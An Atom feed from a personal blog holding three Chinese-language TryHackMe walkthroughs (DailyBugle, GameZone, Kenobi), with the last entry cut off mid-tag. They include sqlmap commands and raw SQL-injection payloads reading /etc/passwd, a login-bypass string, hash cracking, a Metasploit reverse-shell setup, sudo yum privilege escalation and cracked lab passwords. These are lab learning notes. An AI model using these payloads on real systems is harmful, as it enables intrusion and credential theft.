<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>w3nx1z1</title>
  
  <subtitle>w3nx1z1 Blog</subtitle>
  <link href="http://w3nx1z1.github.io/atom.xml" rel="self"/>
  
  <link href="http://w3nx1z1.github.io/"/>
  <updated>2024-11-26T09:06:44.242Z</updated>
  <id>http://w3nx1z1.github.io/</id>
  
  <author>
    <name>w3nx1z1</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Offensive Pentesting-DailyBugle</title>
    <link href="http://w3nx1z1.github.io/2024/11/26/Offensive%20Pentesting-DailyBugle/"/>
    <id>http://w3nx1z1.github.io/2024/11/26/Offensive%20Pentesting-DailyBugle/</id>
    <published>2024-11-26T09:04:51.489Z</published>
    <updated>2024-11-26T09:06:44.242Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Offensive-Pentesting-DailyBugle"><a href="#Offensive-Pentesting-DailyBugle" class="headerlink" title="Offensive Pentesting-DailyBugle"></a>Offensive Pentesting-DailyBugle</h1><pre><code>Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.通过 SQLi 入侵 Joomla CMS 帐户，练习破解哈希并利用 yum 提升您的权限。</code></pre><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><pre><code>nmap -T4 -sC -sV --script=vuln 10.10.46.209</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411210914406.png" alt="image-20241121091426221"></p><p> 开放22 80 3306端口 其中80端口开放的网站服务是使用joomla框架搭建的</p><p>whatweb看一下 没啥有用的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411210949603.png" alt="image-20241121094938510"></p><p>joomla框架的话 用joomlascan扫一下 找到版本为3.7.0</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411210950119.png" alt="image-20241121095047965"></p><p>What is the Joomla version?</p><pre><code>3.7.0</code></pre><p>然后访问一下网页 看到一则银行被抢劫的新闻 作案人是SpiderMan</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411210946626.png" alt="image-20241121094648366"></p><p>Access the web server, who robbed the bank?</p><pre><code>SpiderMan</code></pre><p>其实在前面我们使用Joomlascan来扫描的时候 可以发现扫到了一个admin page</p><pre><code>[+] admin finder[++] Admin page : http://10.10.46.209//administrator</code></pre><p>访问一下 发现是后台登陆页面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411211959653.png" alt="image-20241121195913557"></p><p>到这里 信息搜集基本可以结束 </p><h2 id="Joomla3-7-0sql注入漏洞获取用户登陆密码"><a href="#Joomla3-7-0sql注入漏洞获取用户登陆密码" class="headerlink" title="Joomla3.7.0sql注入漏洞获取用户登陆密码"></a>Joomla3.7.0sql注入漏洞获取用户登陆密码</h2><p>类似的做法我们在DC-3中已经见过 使用sqlmap就可以做到</p><p><a href="https://w3nx1z1.github.io/2023/11/30/vulnhub%E9%9D%B6%E5%9C%BADC-3%E9%80%9A%E5%85%B3wp/">vulnhub靶场记录DC-3</a></p><p>直接看用法</p><pre><code>Using Sqlmap:sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></pre><p>上结果  查到表</p><pre><code>sqlmap -u &quot;http://10.10.46.209/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></pre><pre><code>[*] information_schema[*] joomla[*] mysql[*] performance_schema[*] test</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212002126.png" alt="image-20241121200217046"></p><p>继续在joomla数据库中注出数据表 我们这里需要的是<code>#__users</code>表</p><pre><code>sqlmap -u &quot;http://10.10.46.209/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla --tables -p list[fullordering]</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212003586.png" alt="image-20241121200306529"></p><p>在表中注出字段</p><pre><code>sqlmap -u &quot;http://10.10.46.209/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla -T &#39;#__users&#39; --columns -p list[fullordering]</code></pre><p>我们需要的是username和password字段的值</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212005451.png" alt="image-20241121200507384"></p><p>注出其中的值</p><pre><code>sqlmap -u &quot;http://10.10.46.209/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla -T &#39;#__users&#39; -C &quot;username,password&quot; --dump  -p list[fullordering]</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212006742.png" alt="image-20241121200634697"></p><h3 id="john爆破出jonah用户的密码明文"><a href="#john爆破出jonah用户的密码明文" class="headerlink" title="john爆破出jonah用户的密码明文"></a>john爆破出jonah用户的密码明文</h3><p>下面使用john来进行爆破</p><pre><code>echo $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm &gt;hash1.txtjohn --wordlist=rockyou.txt --user=jonah hash1.txt</code></pre><p>爆破出是spiderman123</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212008740.png" alt="image-20241121200803685"></p><p>使用jonah&#x2F;spiderman123成功登陆网站后台</p><h2 id="靶机shell"><a href="#靶机shell" class="headerlink" title="靶机shell"></a>靶机shell</h2><h3 id="任意文件读取-一个小利用-但是在这里不是很方便"><a href="#任意文件读取-一个小利用-但是在这里不是很方便" class="headerlink" title="任意文件读取(一个小利用 但是在这里不是很方便)"></a>任意文件读取(一个小利用 但是在这里不是很方便)</h3><p>其实joomla3.7.0也是可以利用sqli进行任意文件读取的 这里放几个payload 将想读的文件的绝对路径转hex就行</p><p>正常读  读第一行</p><pre><code>/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,load_file(0x2f6574632f706173737764)),1)</code></pre><p>读正数第N行</p><pre><code>/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,substring_index(substring_index(load_file(0x2f6574632f706173737764),0x0a,N),0x0a,-1)),1)</code></pre><p>读倒数第N行(因为他这个情况下只能显示出来一行)</p><pre><code>/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,substring_index(substring_index(load_file(0x2f6574632f706173737764),0x0a,-N+1),0x0a,1)),1)</code></pre><p>这里成功读到倒数第三行的靶机中另一个用户</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212137163.png" alt="image-20241121213753065"></p><p>后面还可以继续读<code>/var/www/html/configuration.php</code>这里面有jjameson用户的登陆密码 再通过ssh的方式拿到shell 但是这里文件读取有行数和每行字数的限制 都不全 所以也不行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212148477.png" alt="image-20241121214840418"></p><h3 id="另外其实msfconsole上也有利用方式-但是不知道为什么怎么都连不上去"><a href="#另外其实msfconsole上也有利用方式-但是不知道为什么怎么都连不上去" class="headerlink" title="另外其实msfconsole上也有利用方式 但是不知道为什么怎么都连不上去"></a>另外其实msfconsole上也有利用方式 但是不知道为什么怎么都连不上去</h3><p>这个方式我们在DC-3的时候是可以成功利用的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212144145.png" alt="image-20241121214445084"></p><h3 id="sql注入读文件拿到登陆密码"><a href="#sql注入读文件拿到登陆密码" class="headerlink" title="sql注入读文件拿到登陆密码"></a>sql注入读文件拿到登陆密码</h3><pre><code>sqlmap -u &quot;http://10.10.67.113/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -p list[fullordering] --dbms mysql --technique E --file-read /var/www/html/configuration.php --batch</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212149708.png" alt="image-20241121214932637"></p><pre><code>nv5uz9r3ZEDzVjNu</code></pre><p>直接ssh连</p><pre><code>ssh jjameson@10.10.67.113 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212151142.png" alt="image-20241121215144074"></p><h3 id="修改模板代码进行反弹shell"><a href="#修改模板代码进行反弹shell" class="headerlink" title="修改模板代码进行反弹shell"></a>修改模板代码进行反弹shell</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212152691.png" alt="image-20241121215255610"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212153939.png" alt="image-20241121215314878"></p><h2 id="yum提权"><a href="#yum提权" class="headerlink" title="yum提权"></a>yum提权</h2><p>先看suid</p><pre><code>find / -type f -perm -u=s 2&gt;/dev/null</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212154134.png" alt="image-20241121215422085"></p><p>有su和sudo 但是很可惜这里用不了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212154805.png" alt="image-20241121215452760"></p><p>再看有root权限的命令</p><pre><code>sudo -l</code></pre><p>发现yum可以</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212156030.png" alt="image-20241121215600967"></p><p>直接在<a href="https://gtfobins.github.io/">GTFOBins</a>上面 找到利用方法</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212156003.png" alt="image-20241121215653950"></p><p>照着打就行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212157382.png" alt="image-20241121215719315"></p><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>1.Joomla3.7.0 sql注入拿到后台登陆密码</p><p>2.修改模板代码反弹shell</p><p>3.sql注入拿用户密码</p><p>4.yum提权</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Offensive-Pentesting-DailyBugle&quot;&gt;&lt;a href=&quot;#Offensive-Pentesting-DailyBugle&quot; class=&quot;headerlink&quot; title=&quot;Offensive Pentesting-DailyBugl</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="thm学习笔记" scheme="http://w3nx1z1.github.io/tags/thm%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Offensive Pentesting-GameZone</title>
    <link href="http://w3nx1z1.github.io/2024/11/26/Offensive%20Pentesting-GameZone/"/>
    <id>http://w3nx1z1.github.io/2024/11/26/Offensive%20Pentesting-GameZone/</id>
    <published>2024-11-26T09:04:48.797Z</published>
    <updated>2024-11-26T09:06:40.340Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Offensive-Pentesting-GameZone"><a href="#Offensive-Pentesting-GameZone" class="headerlink" title="Offensive Pentesting-GameZone"></a>Offensive Pentesting-GameZone</h1><h2 id="Deploy-the-vulnerable-machine"><a href="#Deploy-the-vulnerable-machine" class="headerlink" title="Deploy the vulnerable machine"></a>Deploy the vulnerable machine</h2><p>拿到靶机 先扫端口</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172254919.png" alt="image-20241117225437774"></p><p>只是开启了22端口的ssh服务和80端口的web服务</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172301781.png" alt="image-20241117230136420"></p><p>访问一下网站</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172310906.png" alt="image-20241117231042730"></p><p>What is the name of the large cartoon avatar holding a sniper on the forum?</p><pre><code>Agent 47</code></pre><p>问的是背景中这个拿着狙击枪的角色是 我们把这张图单独保存出来 百度识图一下得知是《杀手》游戏中的主角</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172314464.png" alt="image-20241117231439353"></p><h2 id="Obtain-access-via-SQLi"><a href="#Obtain-access-via-SQLi" class="headerlink" title="Obtain access via SQLi"></a>Obtain access via SQLi</h2><p>SQL 是一种用于在数据库中存储、编辑和检索数据的标准语言。查询可能如下所示：</p><pre><code>SELECT * FROM users WHERE username = :username AND password := password</code></pre><p>在我们的 GameZone 机器中，当您尝试登录时，它将从您的用户名和密码中获取您输入的值，然后将它们直接插入到上面的查询中。如果查询找到数据，您将被允许登录，否则它将显示一条错误消息。</p><p>这是一个潜在的漏洞位置，因为您可以将用户名输入为另一个 SQL 查询。这将写入、放置和执行查询。</p><p>让我们使用上面学到的知识来操作查询并在没有任何合法凭证的情况下登录。</p><p>如果我们的用户名是 admin，密码是： <code>&#39; or 1=1 -- -</code>它会将其插入到查询中并验证我们的会话。</p><p>现在在 Web 服务器上执行的 SQL 查询如下所示：</p><pre><code>SELECT * FROM users WHERE username = admin AND password := &#39; or 1=1 -- -</code></pre><p>我们作为密码输入的额外 SQL 更改了上述查询以中断初始查询并继续（与管理员用户一起）如果 1&#x3D;&#x3D;1，则注释查询的其余部分以阻止它中断。</p><p>完成</p><p>GameZone 在数据库中没有管理员用户，但是您仍然可以使用我们在上一个问题中使用的输入密码数据在不知道任何凭据的情况下登录。</p><p>使用 <code>&#39; or 1=1 -- -</code> 作为您的用户名，并将密码留空</p><p>登录后，您将重定向到哪个页面？</p><pre><code>portal.php</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181135932.png" alt="image-20241118113525822"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181135714.png" alt="image-20241118113538644"></p><h2 id="Using-SQLMap"><a href="#Using-SQLMap" class="headerlink" title="Using SQLMap"></a>Using SQLMap</h2><p>重定向到的这个页面是一个游戏评论查询的功能 我们可以在这个页面上进行sql注入 这里直接使用sqlmap</p><p>先用burpsuite把请求包拦一下 将请求包的内容保存到requests.txt中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181152184.png" alt="image-20241118115229127"></p><pre><code>sqlmap -r requests.txt --dbms=mysql --dump</code></pre><p>使用–dbms指定数据库的类型 –dump直接转储数据库表项,查询字段值 </p><p>输出了db数据库中的两个表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181154640.png" alt="image-20241118115453573"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181154331.png" alt="image-20241118115457279"></p><p>在 users 表中，哈希密码是什么？</p><pre><code>ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14</code></pre><p>与哈希密码关联的用户名是什么？</p><pre><code>agent47</code></pre><p>另一个表名是什么？</p><pre><code>post</code></pre><h2 id="Cracking-a-password-with-JohnTheRipper"><a href="#Cracking-a-password-with-JohnTheRipper" class="headerlink" title="Cracking a password with JohnTheRipper"></a>Cracking a password with JohnTheRipper</h2><p>下一步我们使用john来爆破密码</p><pre><code>john hash.txt --wordlist=rockyou.txt --format=Raw-SHA256</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181157277.png" alt="image-20241118115759212"></p><p>拿到密码明文是</p><pre><code>videogamer124</code></pre><p>有了用户名和密码 我们可以使用ssh远程连接 获取agent47用户的shell 并拿到用户目录下的flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181159788.png" alt="image-20241118115914731"></p><p>什么是用户标志？</p><pre><code>649ac17b1480ac13ef1e4fa579dac95c</code></pre><h2 id="Exposing-services-with-reverse-SSH-tunnels-使用反向-SSH-隧道公开服务"><a href="#Exposing-services-with-reverse-SSH-tunnels-使用反向-SSH-隧道公开服务" class="headerlink" title="Exposing services with reverse SSH tunnels(使用反向 SSH 隧道公开服务)"></a>Exposing services with reverse SSH tunnels(使用反向 SSH 隧道公开服务)</h2><p>反向 SSH 端口转发将远程服务器主机上的给定端口转发到本地端的给定主机和端口。</p><p><strong>-L</strong> 是本地隧道 （YOU &lt;– CLIENT）。如果站点被阻止，您可以将流量转发到您拥有的服务器并查看它。例如，如果你在本地访问远程服务器开启的网页被拒绝时，您可以执行</p><pre><code>ssh -L 9000:imgur.com:80 user@example.com</code></pre><p>转到您计算机上的 localhost:9000，将使用您的其他服务器加载这个远程服务器的服务流量。</p><p><strong>-R</strong> 是远程隧道 （YOU –&gt; CLIENT）。您将流量转发到其他服务器供其他人查看。与上面的示例类似，但是相反</p><pre><code>我们将使用一个名为 ss 的工具来调查主机上运行的sockets如果我们运行 ss -tulpn，它会告诉我们正在运行哪些sockets连接</code></pre><table><thead><tr><th><strong>Argument</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td>-t</td><td>Display TCP sockets</td></tr><tr><td>-u</td><td>Display UDP sockets</td></tr><tr><td>-l</td><td>Displays only listening sockets</td></tr><tr><td>-p</td><td>Shows the process using the socket</td></tr><tr><td>-n</td><td>Doesn’t resolve service names</td></tr></tbody></table><p>现在我们可以在靶机中运行一下这个命令 查看一下有多少TCP的sockets在运行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181648577.png" alt="image-20241118164804514"></p><p>How many TCP sockets are running?</p><pre><code>5</code></pre><p>我们可以看到，运行在端口 10000 上的服务被防火墙规则从外部阻止了（我们可以从 IPtable 列表中看到这一点）。但是，使用 SSH 隧道，我们可以将端口公开给我们（本地）</p><pre><code>sudo iptables -L -n -v</code></pre><p>在本地 我们运行 这样10.10.137.213开放的端口10000的服务就会转发到我们本地的10000端口上</p><pre><code>ssh -L 10000:localhost:10000 agent47@10.10.137.213</code></pre><p>现在访问<code>localhost:10000</code> 就可以访问到这个web服务 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181657049.png" alt="image-20241118165732947"></p><p>尝试发现 网站的登陆密码也是agent47&#x2F;videogamer124 成功登陆后台</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181658156.png" alt="image-20241118165808082"></p><p>What is the name of the exposed CMS?</p><pre><code>Webmin</code></pre><p>What is the CMS version?</p><pre><code>1.580</code></pre><h2 id="Privilege-Escalation-with-Metasploit"><a href="#Privilege-Escalation-with-Metasploit" class="headerlink" title="Privilege Escalation with Metasploit"></a>Privilege Escalation with Metasploit</h2><p>有了cms的版本 我们直接使用msfconsole来提权 这里就直接使用第一个payload来自动提权</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181659845.png" alt="image-20241118165954787"></p><p>需要提前设置的条件有</p><pre><code>use 0set payload cmd/unix/reverseset RHOSTS localhostset RPOST 10000set PASSWORD videogamer124set USERNAME agent47set LHOST 10.11.114.143set ssl false</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181700941.png" alt="image-20241118170035861"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181707215.png" alt="image-20241118170727069"></p><p>已经创建了一个session会话 直接打开</p><pre><code>sessions -lsessions 1</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181708778.png" alt="image-20241118170859673"></p><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>1.sql注入重定向</p><p>2.sqlmap注出数据库中的账密信息</p><p>3.john破解密码哈希</p><p>4.反向ssh隧道端口转发</p><p>5.Webmin 1.580漏洞 msfconsole提权</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Offensive-Pentesting-GameZone&quot;&gt;&lt;a href=&quot;#Offensive-Pentesting-GameZone&quot; class=&quot;headerlink&quot; title=&quot;Offensive Pentesting-GameZone&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="thm学习笔记" scheme="http://w3nx1z1.github.io/tags/thm%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Offensive Pentesting-Kenobi</title>
    <link href="http://w3nx1z1.github.io/2024/11/26/Offensive%20Pentesting-Kenobi/"/>
    <id>http://w3nx1z1.github.io/2024/11/26/Offensive%20Pentesting-Kenobi/</id>
    <published>2024-11-26T09:04:45.988Z</published>
    <updated>2024-11-26T09:06:37.410Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Offensive-Pentesting-Kenobi"><a href="#Offensive-Pentesting-Kenobi" class="headerlink" title="Offensive Pentesting-Kenobi"></a>Offensive Pentesting-Kenobi</h1><pre><code>Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.此房间将涵盖访问 Samba 共享、操纵易受攻击的 proftpd 版本以获得初始访问权限，并通过 SUID 二进制文件将您的权限升级到 root。</code></pre><h2 id="扫端口"><a href="#扫端口" class="headerlink" title="扫端口"></a>扫端口</h2><pre><code>┌──(root㉿kali)-[/home/w3nx1z1]└─# nmap -T4 -sV -sC 10.10.233.125Starting Nmap 7.92 ( https://nmap.org ) at 2024-11-17 11:09 CSTNmap scan report for 10.10.233.125Host is up (0.27s latency).Not shown: 993 closed tcp ports (reset)PORT     STATE SERVICE     VERSION21/tcp   open  ftp         ProFTPD 1.3.522/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)| http-robots.txt: 1 disallowed entry |_/admin.html|_http-title: Site doesn&#39;t have a title (text/html).111/tcp  open  rpcbind     2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100003  2,3,4       2049/tcp   nfs|   100003  2,3,4       2049/tcp6  nfs|   100003  2,3,4       2049/udp   nfs|   100003  2,3,4       2049/udp6  nfs|   100005  1,2,3      36585/udp   mountd|   100005  1,2,3      49263/tcp   mountd|   100005  1,2,3      54329/udp6  mountd|   100005  1,2,3      59841/tcp6  mountd|   100021  1,3,4      39645/tcp   nlockmgr|   100021  1,3,4      40321/udp6  nlockmgr|   100021  1,3,4      44189/tcp6  nlockmgr|   100021  1,3,4      58684/udp   nlockmgr|   100227  2,3         2049/tcp   nfs_acl|   100227  2,3         2049/tcp6  nfs_acl|   100227  2,3         2049/udp   nfs_acl|_  100227  2,3         2049/udp6  nfs_acl139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)2049/tcp open  nfs_acl     2-3 (RPC #100227)Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)|_clock-skew: mean: 1h59m59s, deviation: 3h27m51s, median: -1s|_nbstat: NetBIOS name: KENOBI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb2-security-mode: |   3.1.1: |_    Message signing enabled but not required| smb2-time: |   date: 2024-11-17T03:10:03|_  start_date: N/A| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)|   Computer name: kenobi|   NetBIOS computer name: KENOBI\x00|   Domain name: \x00|   FQDN: kenobi|_  System time: 2024-11-16T21:10:03-06:00Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 25.90 seconds</code></pre><p>Scan the machine with nmap, how many ports are open?</p><pre><code>7</code></pre><h2 id="Enumerating-Samba-for-shares-枚举Samba"><a href="#Enumerating-Samba-for-shares-枚举Samba" class="headerlink" title="Enumerating Samba for shares(枚举Samba)"></a>Enumerating Samba for shares(枚举Samba)</h2><pre><code>Samba 是适用于 Linux 和 Unix 的标准 Windows 互操作性程序套件。它允许最终用户访问和使用公司内部网或互联网上的文件、打印机和其他常见共享资源。它通常被称为网络文件系统。Samba 基于服务器消息块 （SMB） 的通用客户端/服务器协议。SMB 专为 Windows 开发，如果没有 Samba，其他计算机平台将与 Windows 计算机隔离，即使它们属于同一网络。</code></pre><p>使用 nmap，我们可以枚举 SMB 共享的计算机。</p><p>Nmap 能够运行以自动执行各种网络任务。有一个脚本可以列举份额！</p><pre><code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.233.125</code></pre><p>SMB 有两个端口，即 445 和 139。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171126600.png" alt="https://i.imgur.com/bkgVNy3.png"></p><p>使用上面的 nmap 命令，找到了多少个共享？</p><pre><code>3</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171127818.png" alt="image-20241117112738713"></p><p>我们可以使用这条命令来连接到计算机的网络共享 并查看其中的文件</p><pre><code>smbclient //10.10.233.125/anonymous</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171130073.png" alt="image-20241117113021004"></p><p>连接后，列出共享中的文件。您可以看到什么文件？</p><pre><code>log.txt</code></pre><p>可以使用more命令来读取其中的内容</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171155750.png" alt="image-20241117115555645"></p><p>到这里其实已经可以回答下面的问题了</p><p>What port is FTP running on?</p><pre><code>21</code></pre><p>在接着往下看</p><p>您也可以以递归方式下载 SMB 共享。将用户名和密码作为 nothing 提交。</p><pre><code>smbget -R smb://10.10.40.36/anonymous</code></pre><p>打开共享上的文件。发现了一些有趣的事情。</p><ul><li>可以发现为kenobi用户生成了ssh私钥的信息</li><li>有关 ProFTPD 服务器的信息。</li></ul><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171711745.png" alt="image-20241117171131658"></p><p>这个操作和网络速度有关系 有时候会报错连接不上 多试几次就好了</p><p>这部分是为用户生成 SSH 密钥时为 Kenobi 生成的信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171721192.png" alt="image-20241117172142137"></p><p>这一部分是有关 ProFTPD 服务器的信息 也提到了FTP服务在21端口上运行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171723192.png" alt="image-20241117172355122"></p><p>您之前的 nmap 端口扫描将显示端口 111 运行服务 rpcbind。这只是一个将远程过程调用 （RPC） 程序编号转换为通用地址的服务器。当 RPC 服务启动时，它会告诉 rpcbind 它正在侦听的地址以及它准备提供的 RPC 程序编号。</p><p>在我们的例子中，端口 111 是对网络文件系统的访问。让我们用 nmap 来列举一下。</p><pre><code>nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.40.36</code></pre><p>这里可以看到开放的111端口运行了rpcbind服务(远程过程调用) 在这里是远程文件系统的共享 通过nfs-showmount的内容得知 当前目标主机通过nfs服务共享了&#x2F;var文件夹 同时<code>*</code>表示此共享目录对所有客户端（任何主机）都开放访问权限</p><p><img src="C:/Users/hp/AppData/Roaming/Typora/typora-user-images/image-20241117172649592.png" alt="image-20241117172649592"></p><p>What mount can we see?</p><pre><code>/var</code></pre><h2 id="Gain-initial-access-with-ProFtpd-通过ProFtpd-获得初始访问权限"><a href="#Gain-initial-access-with-ProFtpd-通过ProFtpd-获得初始访问权限" class="headerlink" title="Gain initial access with ProFtpd(通过ProFtpd 获得初始访问权限)"></a>Gain initial access with ProFtpd(通过ProFtpd 获得初始访问权限)</h2><pre><code>ProFtpd 是一个免费的开源 FTP 服务器，与 Unix 和 Windows 系统兼容。它在过去的软件版本中也容易受到攻击。</code></pre><p>让我们获取 ProFtpd 的版本。使用 netcat 通过 FTP 端口连接到本机。</p><p>版本是什么？</p><pre><code>1.3.5</code></pre><p>这一点我们在前面nmap扫端口的时候就已经可以分析出来</p><pre><code>PORT     STATE SERVICE     VERSION21/tcp   open  ftp         ProFTPD 1.3.5</code></pre><p>我们可以使用 searchsploit 来查找特定软件版本的漏洞。</p><p>Searchsploit 基本上只是一个用于 exploit-db.com 的命令行搜索工具。</p><p>ProFTPd 运行有多少个漏洞？</p><pre><code>4</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171736471.png" alt="image-20241117173632314"></p><p>但是这里我们不直接使用搜到的ProFTPd 1.3.5的漏洞利用文件 而是按照我们上面在日志中找到的记录  利用为kenobi用户生成的ssh私钥  来ssh远程连接 登录到kenobi账户</p><p>ProFtpd的mod_copy 模块可以实现 <strong>SITE CPFR</strong> 和 <strong>SITE CPTO</strong> 命令，这些命令可用于将文件&#x2F;目录从服务器上的一个位置复制到另一个位置。任何未经身份验证的客户端都可以利用这些命令将文件从文件系统的任何部分复制到选定的目标。</p><p>我们知道 FTP 服务以 Kenobi 用户身份运行（从共享上的文件），并且会为该用户生成 ssh 密钥。</p><p>根据上面找到的开启FTP服务的端口是21 我们可以先来连接这个FTP服务 在日志中找到私钥在目标靶机上保存的路径是&#x2F;home&#x2F;kenobi&#x2F;.ssh&#x2F;id_rsa</p><p><img 